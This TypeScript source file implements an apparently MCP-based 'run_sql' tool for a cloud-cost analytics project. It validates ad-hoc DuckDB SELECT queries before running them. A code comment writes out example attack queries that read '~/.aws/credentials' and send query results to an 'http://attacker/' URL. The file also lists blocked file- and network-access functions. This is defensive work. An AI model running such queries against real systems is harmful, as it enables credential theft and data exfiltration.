import {
  assertDateString,
  buildSource,
  computePeriodsInRange,
  DEFAULT_LAG_DAYS,
  listLocalMonths,
  logger,
} from '@costgoblin/core';
import type { McpContext } from '../context.js';
import type { Cell, Column, StructuredResult } from '../formatters/result.js';
import {
  computeDataCoverage,
  emptyRangeResult,
  getFirstProviderName,
  resolveFormat,
  structuredToolResult,
  toStr,
  toolError,
  toolResult,
} from './tool-helpers.js';

const MAX_LIMIT = 500;

// DuckDB runs with full external access (it has to read the local Parquet that
// backs the `costs` table), so an arbitrary SELECT can otherwise read any file
// on disk or reach the network — e.g. `read_text('~/.aws/credentials')` or
// `read_csv('http://attacker/?d=' || (SELECT ...))`. run_sql is meant to query
// the provided `costs` table only, so reject the ways a SELECT can touch
// files, the network, or evaluate further SQL.
const BLOCKED_FUNCTIONS = [
  'read_csv', 'read_csv_auto', 'read_parquet', 'parquet_scan',
  'parquet_metadata', 'parquet_schema', 'parquet_file_metadata', 'parquet_kv_metadata',
  'read_json', 'read_json_auto', 'read_json_objects', 'read_json_objects_auto',
  'read_ndjson', 'read_ndjson_auto', 'read_ndjson_objects',
  'read_text', 'read_blob', 'sniff_csv', 'glob',
  'query', 'query_table',
  'iceberg_scan', 'iceberg_metadata', 'iceberg_snapshots', 'delta_scan',
  'postgres_scan', 'postgres_query', 'mysql_scan', 'mysql_query',
  'sqlite_scan', 'sqlite_query',
];

/** Replace string literals (with '' escapes) and comments with inert
 *  placeholders in a single pass, so the structural checks below can't be
 *  fooled by a keyword hidden inside a string, nor by a `--`/`/*` that is
 *  itself inside a string literal. The original SQL is what actually runs;
 *  this scrubbed copy is only inspected. */
function scrubSql(sql: string): string {
  let out = '';
  let i = 0;
  const n = sql.length;
  while (i < n) {
    const ch = sql[i];
    if (ch === undefined) break;
    const next = sql[i + 1];
    if (ch === "'") {
      i++;
      while (i < n) {
        if (sql[i] === "'") {
          if (sql[i + 1] === "'") { i += 2; continue; }
          i++;
          break;
        }
        i++;
      }
      out += "''";
      continue;
    }
    if (ch === '-' && next === '-') {
      i += 2;
      while (i < n && sql[i] !== '\n') i++;
      out += ' ';
      continue;
    }
    if (ch === '/' && next === '*') {
      i += 2;
      while (i < n && !(sql[i] === '*' && sql[i + 1] === '/')) i++;
      i += 2;
      out += ' ';
      continue;
    }
    out += ch;
    i++;
  }
  return out;
}

/** Validate an ad-hoc run_sql query. Returns an error message to surface to the
 *  caller, or null when the query is allowed. Defense in depth on top of the
 *  parameterized query layer: run_sql is the one place that takes raw SQL. */
export function validateRunSqlQuery(sql: string): string | null {
  const scrubbed = scrubSql(sql);

  if (!/^\s*(?:WITH|SELECT)\b/i.test(scrubbed)) {
    return 'Only SELECT/WITH queries are allowed. DDL, DML, and COPY statements are rejected for safety.';
  }

  // Single statement only — stop `SELECT 1; COPY ... TO 'file'` style stacking.
  if (scrubbed.replace(/;\s*$/, '').includes(';')) {
    return 'Only a single SQL statement is allowed.';
  }

  // `FROM '/path'` / `JOIN 'x.csv'` triggers DuckDB's replacement scan, reading
  // the path as a file without naming read_csv/read_parquet explicitly.
  if (/\b(?:from|join)\s+'/i.test(scrubbed)) {
    return 'Reading from a file path is not allowed — query the provided `costs` table.';
  }

  for (const fn of BLOCKED_FUNCTIONS) {
    if (new RegExp(`\\b${fn}\\s*\\(`, 'i').test(scrubbed)) {
      return `The function ${fn}() is not allowed in run_sql — query the provided \`costs\` table instead.`;
    }
  }

  return null;
}

export async function runSql(
  ctx: McpContext,
  params: {
    sql: string;
    limit?: number | undefined;
    dateRange?: { start: string; end: string } | undefined;
    format?: string | undefined;
  },
): Promise<{ content: [{ type: 'text'; text: string }] }> {
  const format = resolveFormat(params.format);
  const userSql = params.sql.trim();
  const limit = Math.min(params.limit ?? 100, MAX_LIMIT);

  const validationError = validateRunSqlQuery(userSql);
  if (validationError !== null) {
    return toolError(validationError);
  }

  const dimensions = await ctx.getQueryDimensions();
  const orgPath = await ctx.getOrgAccountsPath();
  const availableColumns = await ctx.getAvailableColumns('daily');

  let dateRange: { start: string; end: string };
  if (params.dateRange !== undefined) {
    assertDateString(params.dateRange.start);
    assertDateString(params.dateRange.end);
    dateRange = params.dateRange;
  } else {
    const dayMs = 86_400_000;
    const end = new Date(Date.now() - DEFAULT_LAG_DAYS * dayMs);
    const start = new Date(end.getTime() - 59 * dayMs);
    dateRange = {
      start: start.toISOString().slice(0, 10),
      end: end.toISOString().slice(0, 10),
    };
  }

  const matSource = ctx.materializedBase.getSource(dateRange, 'daily');
  let costsCte: string;

  if (matSource !== undefined) {
    costsCte = `costs AS (SELECT * FROM ${matSource} WHERE usage_date BETWEEN '${dateRange.start}' AND '${dateRange.end}')`;
  } else {
    const provider = await getFirstProviderName(ctx);
    const available = provider === null ? [] : await listLocalMonths(ctx.dataDir, provider, 'daily');
    const required = computePeriodsInRange(dateRange);
    const periods = required.filter(p => available.includes(p));
    if (provider === null || periods.length === 0) {
      return emptyRangeResult(ctx, dateRange, format, `Query Result`);
    }
    const source = buildSource({
      dataDir: ctx.dataDir,
      tier: 'daily',
      dimensions,
      orgAccountsPath: orgPath,
      providers: [{ name: provider, periods, availableColumns }],
      costMetric: 'unblended',
    });
    costsCte = `costs AS (SELECT * FROM ${source} WHERE usage_date BETWEEN '${dateRange.start}' AND '${dateRange.end}')`;
  }

  const hasLimit = /\bLIMIT\s+\d+\s*$/i.test(userSql);
  const wrappedSql = hasLimit
    ? `WITH ${costsCte}\n${userSql}`
    : `WITH ${costsCte}\n${userSql}\nLIMIT ${String(limit)}`;

  logger.info('run-sql', { userSqlLength: userSql.length, limit });

  let rows: Readonly<Record<string, unknown>>[];
  try {
    rows = await ctx.runQuery(wrappedSql);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    return toolError(`Query failed: ${message}`);
  }

  if (rows.length === 0) {
    return toolResult('*Query returned no rows.*');
  }

  const firstRow = rows[0];
  if (firstRow === undefined) {
    return toolResult('*Query returned no rows.*');
  }
  const columnNames = Object.keys(firstRow);

  const columns: Column[] = columnNames.map(name => {
    const sample = firstRow[name];
    return {
      key: name,
      header: name,
      type: typeof sample === 'number' ? 'number' : 'string',
    };
  });

  const tableRows: Cell[][] = rows.map(r =>
    columnNames.map((name): Cell => {
      const val = r[name];
      if (typeof val === 'number') return val;
      if (typeof val === 'bigint') return Number(val);
      return toStr(val);
    }),
  );

  const meta: { label: string; value: string | number; type?: 'number' }[] = [
    { label: 'Rows', value: rows.length, type: 'number' },
  ];
  const notes: string[] = [];
  if (rows.length >= limit) {
    notes.push(`*Results limited to ${String(limit)} rows.*`);
  }

  const coverage = await computeDataCoverage(ctx, dateRange);
  const result: StructuredResult = {
    title: `Query Result`,
    coverage,
    meta,
    notes,
    tables: [{ columns, rows: tableRows }],
  };
  return structuredToolResult(result, format);
}
